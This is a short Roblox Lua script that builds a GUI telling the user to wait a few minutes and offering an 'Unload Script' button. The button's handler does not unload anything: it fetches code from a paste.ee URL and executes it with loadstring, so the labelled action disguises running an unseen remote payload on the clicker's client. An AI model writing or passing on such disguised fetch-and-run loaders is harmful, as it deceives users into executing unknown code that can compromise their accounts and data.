-- Create the GUI container
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "UnloadScriptGUI"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

-- Create the main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 25) -- darker than #000435
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

-- Rounded corners for the frame
local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 15)
frameCorner.Parent = frame

-- Create a label with the description
local description = Instance.new("TextLabel")
description.Size = UDim2.new(1, -20, 0, 50)
description.Position = UDim2.new(0, 10, 0, 10)
description.BackgroundTransparency = 1
description.Text = "Wait 3–5 mins to unload the script"
description.TextColor3 = Color3.fromRGB(255, 255, 255)
description.Font = Enum.Font.SourceSansBold
description.TextScaled = true
description.Parent = frame

-- Create the 'Unload Script' button
local unloadButton = Instance.new("TextButton")
unloadButton.Size = UDim2.new(1, -40, 0, 40)
unloadButton.Position = UDim2.new(0, 20, 1, -50)
unloadButton.BackgroundColor3 = Color3.fromRGB(0, 0, 35)
unloadButton.Text = "Unload Script"
unloadButton.TextColor3 = Color3.fromRGB(255, 255, 255)
unloadButton.Font = Enum.Font.SourceSansBold
unloadButton.TextScaled = true
unloadButton.Parent = frame

-- Rounded corners for the button
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 10)
buttonCorner.Parent = unloadButton

-- Button functionality
unloadButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://paste.ee/r/hHckBavN"))()
end)
